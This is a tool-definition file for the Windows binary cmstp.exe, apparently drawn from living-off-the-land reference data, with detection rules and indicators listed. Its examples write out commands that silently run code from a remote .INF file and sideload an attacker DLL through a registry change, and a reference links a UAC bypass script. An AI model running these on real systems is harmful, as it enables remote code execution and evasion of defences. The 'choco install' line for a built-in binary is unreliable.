---
id: windows-execution-cmstp
namespace: windows:execution:cmstp
name: cmstp
description: 'Installs or removes a Connection Manager service profile. Located at:
  C:\Windows\System32\cmstp.exe; C:\Windows\SysWOW64\cmstp.exe.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- security.execution.command
- security.defense-evasion.bypass
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: low
  disk_io: low
allowed-tools:
- cmstp
parameters: []
features:
- file-system
- local
- network-intensive
- pipes-stdin
- pipes-stdout
- process-manip
- remote
- stealth
execution:
  template: cmstp
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Silently installs a specially formatted local .INF without creating
    a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes
    a .SCT file using scrobj.dll. (Execute code hidden within an inf file. Download
    and run scriptlets from internet.)
  command: cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}
- description: Silently installs a specially formatted remote .INF without creating
    a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes
    a .SCT file using scrobj.dll. (Execute code hidden within an inf file. Execute
    code directly from Internet.)
  command: cmstp.exe /ni /s {REMOTEURL:.inf}
- description: cmstp.exe reads the `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App
    Paths\cmmgr32.exe\CmstpExtensionDll` registry value and passes its data directly
    to `LoadLibrary`. By modifying this registry key and setting it to an attack-controlled
    DLL, this will sideload the DLL via `cmstp.exe`. (Proxy execution of a malicious
    DLL via registry modification.)
  command: cmstp.exe /nf
references:
- label: '958450014111633408'
  url: https://twitter.com/NickTyrer/status/958450014111633408
- label: bbd10d20a5bb78f64a9d13f399ea0f80
  url: https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80
- label: cf36fd40fa991c3a6f7755d1810cc61e
  url: https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e
- label: ''
  url: https://oddvar.moe/2017/08/15/research-on-cmstp-exe/
- label: UACBypassCMSTP.ps1
  url: https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1
- label: cmstp
  url: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp
- label: ea8ad5b8a0904dd40b33f01f0e8285dc
  url: https://gist.github.com/ghosts621/ea8ad5b8a0904dd40b33f01f0e8285dc
techniques:
- execution
- defense-evasion
mitre_ids:
- T1218.003
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_cmstp_execution_by_creation.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_uac_bypass_cmstp.yml
- type: splunk
  url: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/cmlua_or_cmstplua_uac_bypass.yml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
- type: ioc
  description: Execution of cmstp.exe without a VPN use case is suspicious
- type: ioc
  description: DotNet CLR libraries loaded into cmstp.exe
- type: ioc
  description: DotNet CLR Usage Log - cmstp.exe.log
- type: ioc
  description: Registry modification to HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App
    Paths\cmmgr32.exe\CmstpExtensionDll
install:
- method: choco
  package_name: cmstp
  commands:
  - choco install cmstp
---

# cmstp

cmstp is a Windows LOLBin. Installs or removes a Connection Manager service profile. Located at: C:\Windows\System32\cmstp.exe; C:\Windows\SysWOW64\cmstp.exe.
